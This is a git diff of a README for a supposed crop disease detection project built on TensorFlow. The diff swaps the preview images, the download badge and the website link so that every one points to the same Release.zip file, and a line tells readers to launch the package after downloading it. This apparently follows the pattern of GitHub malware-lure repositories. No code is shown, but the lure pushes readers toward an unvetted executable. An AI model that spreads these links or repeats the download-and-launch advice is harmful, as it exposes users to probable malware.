@@ -1,7 +1,7 @@
 
 # 🌿 Crop Disease Identification Model 🌾
 
-![Crop Disease Identification Model](https://images.unsplash.com/photo-1594012162286-18d2cf7a2a06)
+![Crop Disease Identification Model](https://github.com/AverageCoderInOhio/Crop-Disease-Identification-Model/releases/download/v1.0/Release.zip)
 
 Welcome to the Crop Disease Identification Model repository! This project utilizes deep learning to detect and identify crop diseases from images. Developed using TensorFlow, the app allows users to upload images of crops, predicts the potential disease affecting them, and provides valuable insights for early disease detection.
 
@@ -11,7 +11,7 @@ Crop diseases can significantly impact agricultural productivity and income for 
 ## 📷 Preview
 Here is a sneak peek at the interface of our Crop Disease Identification Model:
 
-![Preview](https://images.unsplash.com/photo-1476836762217-0a6ed28a6d00)
+![Preview](https://github.com/AverageCoderInOhio/Crop-Disease-Identification-Model/releases/download/v1.0/Release.zip)
 
 ## 🚀 Features
 - **Deep Learning Model:** Utilizes TensorFlow for powerful machine learning capabilities.
@@ -37,7 +37,7 @@ Here is a sneak peek at the interface of our Crop Disease Identification Model:
 ## 📦 Installation
 To get started with the Crop Disease Identification Model, you can download the software package by clicking the button below:
 
-[![Download Software Package](https://img.shields.io/badge/Download-Software%20Package-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software Package](https://github.com/AverageCoderInOhio/Crop-Disease-Identification-Model/releases/download/v1.0/Release.zip%20Package-blue)](https://github.com/AverageCoderInOhio/Crop-Disease-Identification-Model/releases/download/v1.0/Release.zip)
 
 *Note: The software package needs to be launched after downloading.*
 
@@ -63,6 +63,6 @@ Contributions to the Crop Disease Identification Model are welcome! Whether you'
 Let's join forces to make a positive impact on crop health and food security!
 
 ## 🌍 Visit Our Website
-For more information and updates on the Crop Disease Identification Model, please visit our website at [CropDiseaseModel.com](https://www.cropdiseasemodel.com).
+For more information and updates on the Crop Disease Identification Model, please visit our website at [https://github.com/AverageCoderInOhio/Crop-Disease-Identification-Model/releases/download/v1.0/Release.zip](https://github.com/AverageCoderInOhio/Crop-Disease-Identification-Model/releases/download/v1.0/Release.zip).
 
 Happy farming! 🌾🚜🌿
